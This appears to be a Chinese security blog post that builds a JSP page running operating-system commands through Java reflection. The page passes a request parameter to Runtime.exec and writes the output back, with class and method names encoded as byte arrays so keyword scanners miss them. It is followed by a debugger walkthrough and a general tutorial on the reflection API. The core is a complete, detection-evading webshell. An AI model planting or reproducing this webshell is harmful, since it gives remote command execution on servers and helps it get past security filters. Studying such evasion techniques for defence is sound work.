# Java反射机制实现无关键字执行命令




## 搭建环境

新建maven项目 + tomcat 

pom.xml引入servlet

```xml
<dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>javax.servlet-api</artifactId>
      <version>4.0.1</version>
    </dependency>

```





## 代码



cmd.jsp

```jsp
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.InputStream" %><%--
  Created by IntelliJ IDEA.
  User: 19401
  Date: 2022/1/12
  Time: 17:13
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String str = request.getParameter("str");

    // 定义"java.lang.Runtime"字符串变量
    String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101});

    // 反射java.lang.Runtime类获取Class对象
    Class<?> c = null;
    try {
        c = Class.forName(rt);
        // 反射获取Runtime类的getRuntime方法
        Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101}));

        // 反射获取Runtime类的exec方法
        Method m2 = c.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);

        // 反射调用Runtime.getRuntime().exec(xxx)方法
        Object obj2 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{str});

        // 反射获取Process类的getInputStream方法
        Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));
        m.setAccessible(true);

        // 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串
        Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]{})).useDelimiter("\\A");
        String result = s.hasNext() ? s.next() : "";

        // 输出命令执行结果
        out.println(result);

    } catch (Exception e) {
        e.printStackTrace();
    }


%>

```



能正常执行：

![成功执行命令](http://image.xpshuai.cn/img/image-20220112172110896.png)





## 简要分析

设置断点，开启debug，浏览器访问地址传参

可以看到str参数值已经变成`whoami`

且rt的值变成`java.lang.Runtime`

![debug1](http://image.xpshuai.cn/img/image-20220112173734115.png)



继续往下走，第22行通过forName()方法来获取到了该class对象

![debug2](http://image.xpshuai.cn/img/image-20220112173917446.png)



继续，下面第24行是通过反射获取类中方法getMethod的方式获取到`getRuntime()`方法

![debug3](http://image.xpshuai.cn/img/image-20220112174841674.png)

然后第27行是获取Runtime类的`exec()`方法

> getMethod()方法
>
> 只能返回一个特定的方法，第一个参数为方法名称，第二个为方法的参数对应Class的对象

![debug4](http://image.xpshuai.cn/img/image-20220112174951580.png)



第29行， 反射通过invoke调用Runtime.getRuntime().exec(xxx)方法

命令执行完毕了



下面是通过getInputStream()使得页面回显的部分

![debug5](http://image.xpshuai.cn/img/image-20220112175328921.png)

成功输出到页面

![debug6](http://image.xpshuai.cn/img/image-20220112175444732.png)



结束







## 补充1：Java字符串转byte数组

```java
import java.util.Arrays;

public class TestByte {
    public static void main (String[] args) throws java.lang.Exception
    {
        //String字符串转byte数组
        String nSndString="java.lang.Runtime.";
        byte[] tBytes=nSndString.getBytes("US-ASCII");
        System.out.println(Arrays.toString(tBytes));

        // byte数组转字符串
        String ss = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46});
        System.out.println(ss);

    }
}

```



![输出结果](http://image.xpshuai.cn/img/image-20220112180105592.png)





## 补充2：Java反射机制

可以无视类方法、变量去访问权限修饰符，并且可以调用任何类的任意方法、访问并修改成员变量值



### 基本运用

#### 获取类对象

1.forName()方法

```java
//使用class类中的方法调用类对象，方便，拓展性强，只要有类的名称即可
public class Test {

    public static void main(String[] args) throws ClassNotFoundException {
        //reflection
        // forName()
        Class name = Class.forName("java.lang.Runtime");
        System.out.println(name);
    }
}
```

2.直接获取

```java
// 直接用.class，简单，但要明确用到类中的静态成员
public class Test {

    public static void main(String[] args) throws ClassNotFoundException {
        //reflection
        // forName()
        Class<?> name = Runtime.class;
        System.out.println(name);
    }
}
```



3.使用getCLass()方法

```java
//通过Object类中的getClass()来获取字节码对象。较繁琐，必须明确具体的类，然后创建对象

public class Test {

    public static void main(String[] args) throws ClassNotFoundException {
        //reflection
        Runtime rt = Runtime.getRuntime();
        Class<?> name = rt.getClass();
        System.out.println(name);
    }
}
```



4.使用getSystemCLassLoader().loadClass()方法

```java
//与forName()类似，知道类名即可，但是有区别。forName()的静态方法JVM会装载类，并且执行static()中的方法
//而这个不会执行static()中的代码
```





#### 获取类方法

获取某个Class对象的方法集合

1.getDeclaredMethods()

```java
// 不返回继承的方法
import java.lang.reflect.Method;

public class Test {

    public static void main(String[] args) throws ClassNotFoundException {
        //reflection
        Class<?> name = Class.forName("java.lang.Runtime");

        Method[] ds = name.getDeclaredMethods();
        for(Method d:ds)
            System.out.println(d);
    }
}
```



2.getMethods()方法

返回某个类中所有的public方法，包括其继承类的public方法



3.getMethod()方法

只能返回一个特定的方法，第一个参数为方法名称，第二个为方法的参数对应CLass的对象



4.getDeclaredMethod()方法

和getMethod类似，只能返回一个特定的方法



#### 获取类成员变量

1.getDeclaredFields()方法

不能获取父类的声明字段

2.getFields方法

能够获取某个类中的所有public字段，包括父类中的字段



3.getDeclaredField方法

只能获得类中的单个成员变量

4.getField方法

于getFields类似，但是只能获取某个特定的public字段，包括父类中的字段





















---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/  

